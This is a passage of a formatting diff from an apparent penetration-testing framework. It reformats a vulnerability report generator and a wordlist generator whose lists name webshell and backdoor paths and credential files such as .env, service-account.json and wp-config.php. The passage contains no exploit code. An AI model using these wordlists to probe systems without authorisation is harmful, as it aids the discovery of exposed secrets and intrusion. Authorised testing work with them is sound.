elif port in [3389, 5985, 5986]:\n                     service_counts[\"Remote Management\"] += 1\n                 else:\n                     service_counts[\"Other\"] += 1\n-        \n+\n         return dict(service_counts)\n-    \n-    def _estimate_surface_evolution(self, recon_results: Dict[str, Any], \n-                                  vulnerabilities: List[VulnerabilityContext]) -> Dict[str, Any]:\n+\n+    def _estimate_surface_evolution(\n+        self, recon_results: Dict[str, Any], vulnerabilities: List[VulnerabilityContext]\n+    ) -> Dict[str, Any]:\n         \"\"\"Estimate how the attack surface might evolve\"\"\"\n         return {\n             \"growth_indicators\": [\n                 \"New service deployments\",\n                 \"Additional subdomain discovery\",\n-                \"Cloud service expansion\"\n+                \"Cloud service expansion\",\n             ],\n             \"risk_amplification_factors\": [\n                 \"Unpatched vulnerabilities becoming exploitable\",\n                 \"New vulnerability disclosures\",\n-                \"Increased attacker interest in identified targets\"\n+                \"Increased attacker interest in identified targets\",\n             ],\n             \"monitoring_recommendations\": [\n                 \"Continuous subdomain monitoring\",\n                 \"Port scan monitoring\",\n                 \"SSL certificate transparency monitoring\",\n-                \"Cloud asset discovery\"\n-            ]\n-        }\n-    \n-    def _perform_temporal_analysis(self, vulnerabilities: List[VulnerabilityContext]) -> Dict[str, Any]:\n+                \"Cloud asset discovery\",\n+            ],\n+        }\n+\n+    def _perform_temporal_analysis(\n+        self, vulnerabilities: List[VulnerabilityContext]\n+    ) -> Dict[str, Any]:\n         \"\"\"Perform temporal analysis of vulnerabilities\"\"\"\n         # Note: In a real implementation, this would analyze vulnerability ages,\n         # patch availability timelines, and historical exploit data\n-        \n+\n         return {\n             \"vulnerability_age_analysis\": {\n                 \"average_days_unpatched\": \"Analysis requires vulnerability disclosure dates\",\n                 \"oldest_vulnerability\": \"Requires CVE date analysis\",\n-                \"newest_vulnerability\": \"Requires recent disclosure tracking\"\n+                \"newest_vulnerability\": \"Requires recent disclosure tracking\",\n             },\n             \"patch_availability\": {\n                 \"patches_available\": \"Requires vendor patch tracking\",\n                 \"patch_complexity\": \"Requires remediation analysis\",\n-                \"zero_day_indicators\": \"Requires threat intelligence correlation\"\n+                \"zero_day_indicators\": \"Requires threat intelligence correlation\",\n             },\n             \"exploit_timeline\": {\n                 \"public_exploits\": \"Requires exploit database correlation\",\n                 \"weaponization_risk\": \"Requires threat landscape analysis\",\n-                \"attacker_interest\": \"Requires dark web monitoring\"\n-            },\n-            \"recommendation\": \"Implement vulnerability age tracking and patch management metrics for improved temporal analysis\"\n-        }\n-    \n-    def _generate_remediation_roadmap(self, vulnerabilities: List[VulnerabilityContext], \n-                                    risk_assessment: Dict[str, Any]) -> Dict[str, Any]:\n+                \"attacker_interest\": \"Requires dark web monitoring\",\n+            },\n+            \"recommendation\": \"Implement vulnerability age tracking and patch management metrics for improved temporal analysis\",\n+        }\n+\n+    def _generate_remediation_roadmap(\n+        self,\n+        vulnerabilities: List[VulnerabilityContext],\n+        risk_assessment: Dict[str, Any],\n+    ) -> Dict[str, Any]:\n         \"\"\"Generate comprehensive remediation roadmap\"\"\"\n         # Get prioritized vulnerabilities\n         priority_list = risk_assessment.get(\"remediation_priority\", [])\n-        \n+\n         # Create time-based roadmap\n         roadmap = {\n             \"immediate_actions\": {\n                 \"timeline\": \"0-24 hours\",\n                 \"actions\": [],\n-                \"success_criteria\": \"Critical vulnerabilities patched or mitigated\"\n+                \"success_criteria\": \"Critical vulnerabilities patched or mitigated\",\n             },\n             \"short_term\": {\n-                \"timeline\": \"1-7 days\", \n+                \"timeline\": \"1-7 days\",\n                 \"actions\": [],\n-                \"success_criteria\": \"High-severity vulnerabilities addressed\"\n+                \"success_criteria\": \"High-severity vulnerabilities addressed\",\n             },\n             \"medium_term\": {\n                 \"timeline\": \"1-4 weeks\",\n                 \"actions\": [],\n-                \"success_criteria\": \"Medium-severity vulnerabilities resolved\"\n+                \"success_criteria\": \"Medium-severity vulnerabilities resolved\",\n             },\n             \"long_term\": {\n                 \"timeline\": \"1-3 months\",\n                 \"actions\": [],\n-                \"success_criteria\": \"All vulnerabilities addressed, process improvements implemented\"\n-            }\n-        }\n-        \n+                \"success_criteria\": \"All vulnerabilities addressed, process improvements implemented\",\n+            },\n+        }\n+\n         # Categorize actions by timeline\n         for item in priority_list[:20]:  # Top 20 priorities\n             priority_score = item.get(\"priority_score\", 0)\n-            \n+\n             action = {\n                 \"vulnerability\": item.get(\"template_id\", \"Unknown\"),\n                 \"target\": item.get(\"target\", \"Unknown\"),\n                 \"effort\": item.get(\"estimated_effort\", \"Unknown\"),\n-                \"justification\": item.get(\"business_justification\", \"\")\n+                \"justification\": item.get(\"business_justification\", \"\"),\n             }\n-            \n+\n             if priority_score >= 8.0:\n                 roadmap[\"immediate_actions\"][\"actions\"].append(action)\n             elif priority_score >= 6.0:\n                 roadmap[\"short_term\"][\"actions\"].append(action)\n             elif priority_score >= 4.0:\n                 roadmap[\"medium_term\"][\"actions\"].append(action)\n             else:\n                 roadmap[\"long_term\"][\"actions\"].append(action)\n-        \n+\n         # Add strategic initiatives\n         roadmap[\"strategic_initiatives\"] = {\n             \"security_program_improvements\": [\n                 \"Implement continuous vulnerability monitoring\",\n                 \"Enhance patch management processes\",\n                 \"Improve security awareness training\",\n-                \"Establish security metrics and reporting\"\n+                \"Establish security metrics and reporting\",\n             ],\n             \"technology_improvements\": [\n                 \"Deploy additional security controls\",\n                 \"Upgrade vulnerable components\",\n                 \"Implement security automation\",\n-                \"Enhance logging and monitoring\"\n-            ]\n-        }\n-        \n+                \"Enhance logging and monitoring\",\n+            ],\n+        }\n+\n         return roadmap\n-    \n-    def _generate_compliance_assessment(self, vulnerabilities: List[VulnerabilityContext], \n-                                      risk_assessment: Dict[str, Any]) -> Dict[str, Any]:\n+\n+    def _generate_compliance_assessment(\n+        self,\n+        vulnerabilities: List[VulnerabilityContext],\n+        risk_assessment: Dict[str, Any],\n+    ) -> Dict[str, Any]:\n         \"\"\"Generate compliance assessment\"\"\"\n         compliance_impact = risk_assessment.get(\"compliance_impact\", [])\n         business_context = self._create_business_context()\n-        \n+\n         assessment = {\n             \"frameworks_assessed\": business_context.compliance_requirements,\n             \"compliance_violations\": compliance_impact,\n             \"overall_compliance_risk\": \"LOW\",\n-            \"recommendations\": []\n-        }\n-        \n+            \"recommendations\": [],\n+        }\n+\n         # Determine overall compliance risk\n         if len(compliance_impact) >= 3:\n             assessment[\"overall_compliance_risk\"] = \"HIGH\"\n         elif len(compliance_impact) >= 1:\n             assessment[\"overall_compliance_risk\"] = \"MEDIUM\"\n-        \n+\n         # Generate framework-specific recommendations\n         for framework in business_context.compliance_requirements:\n             if framework == \"GDPR\":\n-                assessment[\"recommendations\"].extend([\n-                    \"Conduct Data Protection Impact Assessment (DPIA)\",\n-                    \"Review data processing activities\",\n-                    \"Enhance breach notification procedures\"\n-                ])\n+                assessment[\"recommendations\"].extend(\n+                    [\n+                        \"Conduct Data Protection Impact Assessment (DPIA)\",\n+                        \"Review data processing activities\",\n+                        \"Enhance breach notification procedures\",\n+                    ]\n+                )\n             elif framework == \"SOX\":\n-                assessment[\"recommendations\"].extend([\n-                    \"Review IT general controls\",\n-                    \"Document remediation activities\",\n-                    \"Implement change management controls\"\n-                ])\n+                assessment[\"recommendations\"].extend(\n+                    [\n+                        \"Review IT general controls\",\n+                        \"Document remediation activities\",\n+                        \"Implement change management controls\",\n+                    ]\n+                )\n             elif framework == \"HIPAA\":\n-                assessment[\"recommendations\"].extend([\n-                    \"Conduct security risk assessment\",\n-                    \"Review access controls for PHI\",\n-                    \"Update security policies and procedures\"\n-                ])\n-        \n+                assessment[\"recommendations\"].extend(\n+                    [\n+                        \"Conduct security risk assessment\",\n+                        \"Review access controls for PHI\",\n+                        \"Update security policies and procedures\",\n+                    ]\n+                )\n+\n         return assessment\n-    \n-    def _generate_strategic_recommendations(self, risk_assessment: Dict[str, Any]) -> List[str]:\n+\n+    def _generate_strategic_recommendations(\n+        self, risk_assessment: Dict[str, Any]\n+    ) -> List[str]:\n         \"\"\"Generate strategic-level recommendations\"\"\"\n         recommendations = []\n-        \n+\n         risk_level = risk_assessment.get(\"risk_level\", \"UNKNOWN\")\n-        \n+\n         if risk_level in [\"CRITICAL\", \"HIGH\"]:\n-            recommendations.extend([\n-                \"Establish incident response team and procedures\",\n-                \"Implement continuous security monitoring\",\n-                \"Consider cyber insurance coverage review\",\n-                \"Engage external security consulting for high-risk areas\"\n-            ])\n-        \n-        recommendations.extend([\n-            \"Develop comprehensive cybersecurity strategy\",\n-            \"Implement security awareness training program\",\n-            \"Establish regular penetration testing schedule\",\n-            \"Create security metrics and KPI dashboard\",\n-            \"Develop vendor security assessment program\",\n-            \"Implement DevSecOps practices\",\n-            \"Establish bug bounty or responsible disclosure program\"\n-        ])\n-        \n+            recommendations.extend(\n+                [\n+                    \"Establish incident response team and procedures\",\n+                    \"Implement continuous security monitoring\",\n+                    \"Consider cyber insurance coverage review\",\n+                    \"Engage external security consulting for high-risk areas\",\n+                ]\n+            )\n+\n+        recommendations.extend(\n+            [\n+                \"Develop comprehensive cybersecurity strategy\",\n+                \"Implement security awareness training program\",\n+                \"Establish regular penetration testing schedule\",\n+                \"Create security metrics and KPI dashboard\",\n+                \"Develop vendor security assessment program\",\n+                \"Implement DevSecOps practices\",\n+                \"Establish bug bounty or responsible disclosure program\",\n+            ]\n+        )\n+\n         return recommendations\n-    \n-    def _generate_monitoring_recommendations(self, vulnerabilities: List[VulnerabilityContext]) -> List[str]:\n+\n+    def _generate_monitoring_recommendations(\n+        self, vulnerabilities: List[VulnerabilityContext]\n+    ) -> List[str]:\n         \"\"\"Generate monitoring and detection recommendations\"\"\"\n         recommendations = [\n             \"Implement continuous vulnerability scanning\",\n             \"Deploy Security Information and Event Management (SIEM)\",\n             \"Establish baseline network traffic monitoring\",\n             \"Implement file integrity monitoring\",\n-            \"Deploy endpoint detection and response (EDR) solutions\"\n+            \"Deploy endpoint detection and response (EDR) solutions\",\n         ]\n-        \n+\n         # Add specific recommendations based on vulnerability types\n         vuln_types = set()\n         for vuln in vulnerabilities:\n-            if hasattr(vuln, 'template_id'):\n+            if hasattr(vuln, \"template_id\"):\n                 template_lower = vuln.template_id.lower()\n                 if \"sql\" in template_lower:\n                     vuln_types.add(\"database\")\n                 elif \"xss\" in template_lower:\n                     vuln_types.add(\"web\")\n                 elif \"auth\" in template_lower:\n                     vuln_types.add(\"authentication\")\n-        \n+\n         if \"database\" in vuln_types:\n             recommendations.append(\"Implement database activity monitoring (DAM)\")\n-        \n+\n         if \"web\" in vuln_types:\n             recommendations.append(\"Deploy Web Application Firewall (WAF) with logging\")\n-        \n+\n         if \"authentication\" in vuln_types:\n             recommendations.append(\"Implement privileged access management (PAM)\")\n-        \n+\n         return recommendations\n-    \n-    def _calculate_analysis_confidence(self, vulnerabilities: List[VulnerabilityContext]) -> Dict[str, Any]:\n+\n+    def _calculate_analysis_confidence(\n+        self, vulnerabilities: List[VulnerabilityContext]\n+    ) -> Dict[str, Any]:\n         \"\"\"Calculate confidence in the analysis\"\"\"\n         if not vulnerabilities:\n-            return {\"overall_confidence\": \"N/A\", \"analysis\": \"No vulnerabilities to assess\"}\n-        \n+            return {\n+                \"overall_confidence\": \"N/A\",\n+                \"analysis\": \"No vulnerabilities to assess\",\n+            }\n+\n         # Calculate average confidence\n-        confidence_scores = [getattr(v, 'confidence', 0.8) for v in vulnerabilities if hasattr(v, 'confidence')]\n-        \n+        confidence_scores = [\n+            getattr(v, \"confidence\", 0.8)\n+            for v in vulnerabilities\n+            if hasattr(v, \"confidence\")\n+        ]\n+\n         if confidence_scores:\n             avg_confidence = statistics.mean(confidence_scores)\n-            confidence_level = \"HIGH\" if avg_confidence > 0.8 else \"MEDIUM\" if avg_confidence > 0.6 else \"LOW\"\n+            confidence_level = (\n+                \"HIGH\"\n+                if avg_confidence > 0.8\n+                else \"MEDIUM\" if avg_confidence > 0.6 else \"LOW\"\n+            )\n         else:\n             avg_confidence = 0.8  # Default\n             confidence_level = \"MEDIUM\"\n-        \n+\n         return {\n             \"overall_confidence\": confidence_level,\n             \"average_score\": round(avg_confidence, 2),\n             \"high_confidence_findings\": len([s for s in confidence_scores if s > 0.8]),\n             \"factors_affecting_confidence\": [\n                 \"Template validation quality\",\n                 \"Response pattern analysis\",\n                 \"False positive filtering effectiveness\",\n-                \"Threat intelligence correlation accuracy\"\n-            ]\n-        }\n-    \n+                \"Threat intelligence correlation accuracy\",\n+            ],\n+        }\n+\n     def _document_methodology(self) -> Dict[str, Any]:\n         \"\"\"Document the analysis methodology\"\"\"\n         return {\n             \"analysis_framework\": \"Bl4ckC3ll_PANTHEON Enhanced Intelligence Engine v9.0.0\",\n             \"components_used\": {\n                 \"intelligent_analyzer\": self.enable_deep_analysis,\n                 \"risk_calculator\": True,\n                 \"correlation_engine\": self.enable_correlation,\n                 \"threat_intelligence\": self.enable_threat_intel,\n-                \"narrative_generation\": self.narrative_generation\n+                \"narrative_generation\": self.narrative_generation,\n             },\n             \"risk_calculation_methodology\": {\n                 \"business_context_weighting\": \"70% business impact, 30% likelihood\",\n                 \"cvss_scoring\": \"Calculated based on severity and template characteristics\",\n                 \"exploitability_assessment\": \"Based on available tools and complexity\",\n-                \"correlation_analysis\": \"Multi-dimensional vulnerability relationship mapping\"\n+                \"correlation_analysis\": \"Multi-dimensional vulnerability relationship mapping\",\n             },\n             \"threat_intelligence_sources\": [\n                 \"Simulated threat feed analysis\",\n                 \"Vulnerability pattern correlation\",\n                 \"Attack vector assessment\",\n-                \"Business context integration\"\n+                \"Business context integration\",\n             ],\n             \"limitations\": [\n                 \"Analysis based on automated scanning results\",\n                 \"Manual verification recommended for critical findings\",\n                 \"Threat intelligence simulation pending real API integration\",\n-                \"Business context requires organization-specific configuration\"\n-            ]\n-        }\n-    \n-    def _generate_fallback_report(self, run_dir: Path, recon_results: Dict[str, Any], \n-                                vuln_results: Dict[str, Any], targets: List[str]) -> Dict[str, Any]:\n+                \"Business context requires organization-specific configuration\",\n+            ],\n+        }\n+\n+    def _generate_fallback_report(\n+        self,\n+        run_dir: Path,\n+        recon_results: Dict[str, Any],\n+        vuln_results: Dict[str, Any],\n+        targets: List[str],\n+    ) -> Dict[str, Any]:\n         \"\"\"Generate fallback report if enhanced analysis fails\"\"\"\n         self.logger.warning(\"Generating fallback report due to analysis failure\")\n-        \n+\n         return {\n             \"report_metadata\": {\n                 \"run_id\": run_dir.name,\n                 \"generation_timestamp\": datetime.now().isoformat(),\n                 \"analysis_engine_version\": \"9.0.0-fallback\",\n                 \"targets_analyzed\": targets,\n-                \"analysis_status\": \"FALLBACK_MODE\"\n+                \"analysis_status\": \"FALLBACK_MODE\",\n             },\n             \"executive_summary\": {\n                 \"message\": \"Basic report generated due to enhanced analysis failure\",\n                 \"targets_scanned\": len(targets),\n                 \"recon_data_available\": bool(recon_results),\n-                \"vulnerability_data_available\": bool(vuln_results)\n+                \"vulnerability_data_available\": bool(vuln_results),\n             },\n             \"raw_data\": {\n                 \"recon_results\": recon_results,\n-                \"vulnerability_results\": vuln_results\n+                \"vulnerability_results\": vuln_results,\n             },\n             \"recommendations\": [\n                 \"Review enhanced analysis configuration\",\n                 \"Check system logs for analysis errors\",\n-                \"Contact support for assistance with intelligent reporting\"\n-            ]\n+                \"Contact support for assistance with intelligent reporting\",\n+            ],\n         }\n \n \n def atomic_write(file_path: Path, content: str) -> bool:\n     \"\"\"Atomic write operation for safe file writing\"\"\"\n     try:\n-        temp_path = file_path.with_suffix('.tmp')\n-        with open(temp_path, 'w', encoding='utf-8') as f:\n+        temp_path = file_path.with_suffix(\".tmp\")\n+        with open(temp_path, \"w\", encoding=\"utf-8\") as f:\n             f.write(content)\n         temp_path.rename(file_path)\n         return True\n     except Exception as e:\n         logging.error(f\"Atomic write failed for {file_path}: {e}\")\n         return False\n \n \n # Import defaultdict for the code\n-from collections import defaultdict\n\\ No newline at end of file\n+from collections import defaultdict\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_wordlists.py\t2025-09-14 19:10:58.550754+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_wordlists.py\t2025-09-14 19:23:11.628636+00:00\n@@ -14,356 +14,673 @@\n # Get project paths\n HERE = Path(__file__).parent\n WORDLISTS_DIR = HERE / \"wordlists_extra\"\n PAYLOADS_DIR = HERE / \"payloads\"\n \n+\n class EnhancedWordlistGenerator:\n     \"\"\"Generate comprehensive wordlists for various scanning purposes\"\"\"\n-    \n+\n     def __init__(self):\n         self.wordlists_dir = WORDLISTS_DIR\n         self.payloads_dir = PAYLOADS_DIR\n-        \n+\n         # Ensure directories exist\n         self.wordlists_dir.mkdir(exist_ok=True)\n         self.payloads_dir.mkdir(exist_ok=True)\n-    \n+\n     def generate_technology_specific_wordlists(self) -> Dict[str, List[str]]:\n         \"\"\"Generate technology-specific wordlists\"\"\"\n         tech_wordlists = {\n-            'php': [\n-                'index.php', 'admin.php', 'login.php', 'config.php', 'info.php',\n-                'phpinfo.php', 'test.php', 'wp-config.php', 'wp-admin.php',\n-                'dashboard.php', 'panel.php', 'control.php', 'setup.php',\n-                'install.php', 'update.php', 'upgrade.php', 'backup.php',\n-                'database.php', 'db.php', 'mysql.php', 'phpmyadmin',\n-                'mail.php', 'contact.php', 'form.php', 'upload.php',\n-                'file.php', 'download.php', 'search.php', 'api.php',\n-                'ajax.php', 'cron.php', 'cronjob.php', 'shell.php',\n-                'webshell.php', 'backdoor.php', 'hack.php', 'exploit.php'\n-            ],\n-            'asp': [\n-                'default.asp', 'index.asp', 'admin.asp', 'login.asp',\n-                'global.asa', 'web.config', 'machine.config', 'error.asp',\n-                'debug.asp', 'test.asp', 'upload.asp', 'file.asp',\n-                'search.asp', 'mail.asp', 'contact.asp', 'form.asp',\n-                'database.asp', 'db.asp', 'sql.asp', 'access.asp'\n-            ],\n-            'aspx': [\n-                'default.aspx', 'index.aspx', 'admin.aspx', 'login.aspx',\n-                'web.config', 'global.asax', 'site.master', 'error.aspx',\n-                'debug.aspx', 'test.aspx', 'upload.aspx', 'file.aspx',\n-                'search.aspx', 'mail.aspx', 'contact.aspx', 'form.aspx',\n-                'api.aspx', 'webservice.asmx', 'service.svc'\n-            ],\n-            'jsp': [\n-                'index.jsp', 'admin.jsp', 'login.jsp', 'error.jsp',\n-                'web.xml', 'context.xml', 'server.xml', 'struts.xml',\n-                'spring.xml', 'hibernate.cfg.xml', 'log4j.properties',\n-                'test.jsp', 'debug.jsp', 'upload.jsp', 'search.jsp',\n-                'api.jsp', 'service.jsp', 'action.jsp', 'bean.jsp'\n-            ],\n-            'nodejs': [\n-                'package.json', 'package-lock.json', 'server.js', 'app.js',\n-                'index.js', 'main.js', 'config.js', 'routes.js',\n-                'controller.js', 'model.js', 'middleware.js', 'auth.js',\n-                'admin.js', 'api.js', 'socket.js', 'cluster.js',\n-                'worker.js', '.env', '.env.local', '.env.production',\n-                'ecosystem.config.js', 'pm2.config.js', 'webpack.config.js'\n-            ],\n-            'python': [\n-                'app.py', 'main.py', 'server.py', 'run.py', 'wsgi.py',\n-                'manage.py', 'settings.py', 'config.py', 'urls.py',\n-                'views.py', 'models.py', 'admin.py', 'forms.py',\n-                'requirements.txt', 'setup.py', 'Pipfile', '.env',\n-                'celery.py', 'tasks.py', 'api.py', 'serializers.py'\n-            ],\n-            'ruby': [\n-                'Gemfile', 'Gemfile.lock', 'config.ru', 'Rakefile',\n-                'application.rb', 'routes.rb', 'database.yml', 'secrets.yml',\n-                'application_controller.rb', 'user.rb', 'admin.rb',\n-                '.env', '.env.local', '.ruby-version', 'unicorn.rb'\n-            ],\n-            'java': [\n-                'web.xml', 'context.xml', 'server.xml', 'application.properties',\n-                'application.yml', 'pom.xml', 'build.gradle', 'web.xml',\n-                'spring-boot.jar', 'application.jar', 'ROOT.war',\n-                'admin.war', 'manager.war', 'host-manager.war'\n-            ]\n+            \"php\": [\n+                \"index.php\",\n+                \"admin.php\",\n+                \"login.php\",\n+                \"config.php\",\n+                \"info.php\",\n+                \"phpinfo.php\",\n+                \"test.php\",\n+                \"wp-config.php\",\n+                \"wp-admin.php\",\n+                \"dashboard.php\",\n+                \"panel.php\",\n+                \"control.php\",\n+                \"setup.php\",\n+                \"install.php\",\n+                \"update.php\",\n+                \"upgrade.php\",\n+                \"backup.php\",\n+                \"database.php\",\n+                \"db.php\",\n+                \"mysql.php\",\n+                \"phpmyadmin\",\n+                \"mail.php\",\n+                \"contact.php\",\n+                \"form.php\",\n+                \"upload.php\",\n+                \"file.php\",\n+                \"download.php\",\n+                \"search.php\",\n+                \"api.php\",\n+                \"ajax.php\",\n+                \"cron.php\",\n+                \"cronjob.php\",\n+                \"shell.php\",\n+                \"webshell.php\",\n+                \"backdoor.php\",\n+                \"hack.php\",\n+                \"exploit.php\",\n+            ],\n+            \"asp\": [\n+                \"default.asp\",\n+                \"index.asp\",\n+                \"admin.asp\",\n+                \"login.asp\",\n+                \"global.asa\",\n+                \"web.config\",\n+                \"machine.config\",\n+                \"error.asp\",\n+                \"debug.asp\",\n+                \"test.asp\",\n+                \"upload.asp\",\n+                \"file.asp\",\n+                \"search.asp\",\n+                \"mail.asp\",\n+                \"contact.asp\",\n+                \"form.asp\",\n+                \"database.asp\",\n+                \"db.asp\",\n+                \"sql.asp\",\n+                \"access.asp\",\n+            ],\n+            \"aspx\": [\n+                \"default.aspx\",\n+                \"index.aspx\",\n+                \"admin.aspx\",\n+                \"login.aspx\",\n+                \"web.config\",\n+                \"global.asax\",\n+                \"site.master\",\n+                \"error.aspx\",\n+                \"debug.aspx\",\n+                \"test.aspx\",\n+                \"upload.aspx\",\n+                \"file.aspx\",\n+                \"search.aspx\",\n+                \"mail.aspx\",\n+                \"contact.aspx\",\n+                \"form.aspx\",\n+                \"api.aspx\",\n+                \"webservice.asmx\",\n+                \"service.svc\",\n+            ],\n+            \"jsp\": [\n+                \"index.jsp\",\n+                \"admin.jsp\",\n+                \"login.jsp\",\n+                \"error.jsp\",\n+                \"web.xml\",\n+                \"context.xml\",\n+                \"server.xml\",\n+                \"struts.xml\",\n+                \"spring.xml\",\n+                \"hibernate.cfg.xml\",\n+                \"log4j.properties\",\n+                \"test.jsp\",\n+                \"debug.jsp\",\n+                \"upload.jsp\",\n+                \"search.jsp\",\n+                \"api.jsp\",\n+                \"service.jsp\",\n+                \"action.jsp\",\n+                \"bean.jsp\",\n+            ],\n+            \"nodejs\": [\n+                \"package.json\",\n+                \"package-lock.json\",\n+                \"server.js\",\n+                \"app.js\",\n+                \"index.js\",\n+                \"main.js\",\n+                \"config.js\",\n+                \"routes.js\",\n+                \"controller.js\",\n+                \"model.js\",\n+                \"middleware.js\",\n+                \"auth.js\",\n+                \"admin.js\",\n+                \"api.js\",\n+                \"socket.js\",\n+                \"cluster.js\",\n+                \"worker.js\",\n+                \".env\",\n+                \".env.local\",\n+                \".env.production\",\n+                \"ecosystem.config.js\",\n+                \"pm2.config.js\",\n+                \"webpack.config.js\",\n+            ],\n+            \"python\": [\n+                \"app.py\",\n+                \"main.py\",\n+                \"server.py\",\n+                \"run.py\",\n+                \"wsgi.py\",\n+                \"manage.py\",\n+                \"settings.py\",\n+                \"config.py\",\n+                \"urls.py\",\n+                \"views.py\",\n+                \"models.py\",\n+                \"admin.py\",\n+                \"forms.py\",\n+                \"requirements.txt\",\n+                \"setup.py\",\n+                \"Pipfile\",\n+                \".env\",\n+                \"celery.py\",\n+                \"tasks.py\",\n+                \"api.py\",\n+                \"serializers.py\",\n+            ],\n+            \"ruby\": [\n+                \"Gemfile\",\n+                \"Gemfile.lock\",\n+                \"config.ru\",\n+                \"Rakefile\",\n+                \"application.rb\",\n+                \"routes.rb\",\n+                \"database.yml\",\n+                \"secrets.yml\",\n+                \"application_controller.rb\",\n+                \"user.rb\",\n+                \"admin.rb\",\n+                \".env\",\n+                \".env.local\",\n+                \".ruby-version\",\n+                \"unicorn.rb\",\n+            ],\n+            \"java\": [\n+                \"web.xml\",\n+                \"context.xml\",\n+                \"server.xml\",\n+                \"application.properties\",\n+                \"application.yml\",\n+                \"pom.xml\",\n+                \"build.gradle\",\n+                \"web.xml\",\n+                \"spring-boot.jar\",\n+                \"application.jar\",\n+                \"ROOT.war\",\n+                \"admin.war\",\n+                \"manager.war\",\n+                \"host-manager.war\",\n+            ],\n         }\n-        \n+\n         return tech_wordlists\n-    \n+\n     def generate_cloud_specific_wordlists(self) -> Dict[str, List[str]]:\n         \"\"\"Generate cloud service specific wordlists\"\"\"\n         cloud_wordlists = {\n-            'aws': [\n-                '.aws', 'aws.json', 'credentials', 'config', 's3',\n-                'bucket', 'ec2', 'lambda', 'cloudformation', 'terraform',\n-                'aws-exports.js', 'amplify', 'cognito', 'dynamodb',\n-                'elasticbeanstalk', 'ecs', 'eks', 'rds', 'redshift'\n-            ],\n-            'azure': [\n-                '.azure', 'azure.json', 'azuredeploy.json', 'parameters.json',\n-                'arm-template', 'bicep', 'storage', 'webapp', 'function',\n-                'keyvault', 'cosmosdb', 'sql', 'redis', 'servicebus'\n-            ],\n-            'gcp': [\n-                '.gcp', 'gcloud', 'service-account.json', 'key.json',\n-                'firebase', 'firestore', 'storage', 'compute', 'kubernetes',\n-                'app.yaml', 'cron.yaml', 'queue.yaml', 'dispatch.yaml'\n-            ],\n-            'docker': [\n-                'Dockerfile', 'docker-compose.yml', 'docker-compose.yaml',\n-                '.dockerignore', 'docker-entrypoint.sh', 'entrypoint.sh',\n-                'supervisord.conf', 'nginx.conf', 'apache2.conf'\n-            ],\n-            'kubernetes': [\n-                'deployment.yaml', 'service.yaml', 'configmap.yaml',\n-                'secret.yaml', 'ingress.yaml', 'namespace.yaml',\n-                'pod.yaml', 'replicaset.yaml', 'statefulset.yaml',\n-                'daemonset.yaml', 'job.yaml', 'cronjob.yaml'\n-            ]\n+            \"aws\": [\n+                \".aws\",\n+                \"aws.json\",\n+                \"credentials\",\n+                \"config\",\n+                \"s3\",\n+                \"bucket\",\n+                \"ec2\",\n+                \"lambda\",\n+                \"cloudformation\",\n+                \"terraform\",\n+                \"aws-exports.js\",\n+                \"amplify\",\n+                \"cognito\",\n+                \"dynamodb\",\n+                \"elasticbeanstalk\",\n+                \"ecs\",\n+                \"eks\",\n+                \"rds\",\n+                \"redshift\",\n+            ],\n+            \"azure\": [\n+                \".azure\",\n+                \"azure.json\",\n+                \"azuredeploy.json\",\n+                \"parameters.json\",\n+                \"arm-template\",\n+                \"bicep\",\n+                \"storage\",\n+                \"webapp\",\n+                \"function\",\n+                \"keyvault\",\n+                \"cosmosdb\",\n+                \"sql\",\n+                \"redis\",\n+                \"servicebus\",\n+            ],\n+            \"gcp\": [\n+                \".gcp\",\n+                \"gcloud\",\n+                \"service-account.json\",\n+                \"key.json\",\n+                \"firebase\",\n+                \"firestore\",\n+                \"storage\",\n+                \"compute\",\n+                \"kubernetes\",\n+                \"app.yaml\",\n+                \"cron.yaml\",\n+                \"queue.yaml\",\n+                \"dispatch.yaml\",\n+            ],\n+            \"docker\": [\n+                \"Dockerfile\",\n+                \"docker-compose.yml\",\n+                \"docker-compose.yaml\",\n+                \".dockerignore\",\n+                \"docker-entrypoint.sh\",\n+                \"entrypoint.sh\",\n+                \"supervisord.conf\",\n+                \"nginx.conf\",\n+                \"apache2.conf\",\n+            ],\n+            \"kubernetes\": [\n+                \"deployment.yaml\",\n+                \"service.yaml\",\n+                \"configmap.yaml\",\n+                \"secret.yaml\",\n+                \"ingress.yaml\",\n+                \"namespace.yaml\",\n+                \"pod.yaml\",\n+                \"replicaset.yaml\",\n+                \"statefulset.yaml\",\n+                \"daemonset.yaml\",\n+                \"job.yaml\",\n+                \"cronjob.yaml\",\n+            ],\n         }\n-        \n+\n         return cloud_wordlists\n-    \n+\n     def generate_api_wordlists(self) -> List[str]:\n         \"\"\"Generate API-specific paths and endpoints\"\"\"\n         api_paths = [\n             # REST API patterns\n-            'api', 'api/v1', 'api/v2', 'api/v3', 'apis', 'rest',\n-            'graphql', 'gql', 'ws', 'websocket', 'socket',\n-            \n+            \"api\",\n+            \"api/v1\",\n+            \"api/v2\",\n+            \"api/v3\",\n+            \"apis\",\n+            \"rest\",\n+            \"graphql\",\n+            \"gql\",\n+            \"ws\",\n+            \"websocket\",\n+            \"socket\",\n             # Common endpoints\n-            'api/users', 'api/user', 'api/login', 'api/auth',\n-            'api/admin', 'api/config', 'api/status', 'api/health',\n-            'api/metrics', 'api/debug', 'api/test', 'api/docs',\n-            'api/swagger', 'api/openapi', 'api/schema',\n-            \n+            \"api/users\",\n+            \"api/user\",\n+            \"api/login\",\n+            \"api/auth\",\n+            \"api/admin\",\n+            \"api/config\",\n+            \"api/status\",\n+            \"api/health\",\n+            \"api/metrics\",\n+            \"api/debug\",\n+            \"api/test\",\n+            \"api/docs\",\n+            \"api/swagger\",\n+            \"api/openapi\",\n+            \"api/schema\",\n             # CRUD operations\n-            'api/create', 'api/read', 'api/update', 'api/delete',\n-            'api/list', 'api/get', 'api/post', 'api/put',\n-            'api/patch', 'api/search', 'api/filter', 'api/query',\n-            \n+            \"api/create\",\n+            \"api/read\",\n+            \"api/update\",\n+            \"api/delete\",\n+            \"api/list\",\n+            \"api/get\",\n+            \"api/post\",\n+            \"api/put\",\n+            \"api/patch\",\n+            \"api/search\",\n+            \"api/filter\",\n+            \"api/query\",\n             # Data formats\n-            'api/json', 'api/xml', 'api/csv', 'api/pdf',\n-            'api/export', 'api/import', 'api/backup', 'api/restore',\n-            \n+            \"api/json\",\n+            \"api/xml\",\n+            \"api/csv\",\n+            \"api/pdf\",\n+            \"api/export\",\n+           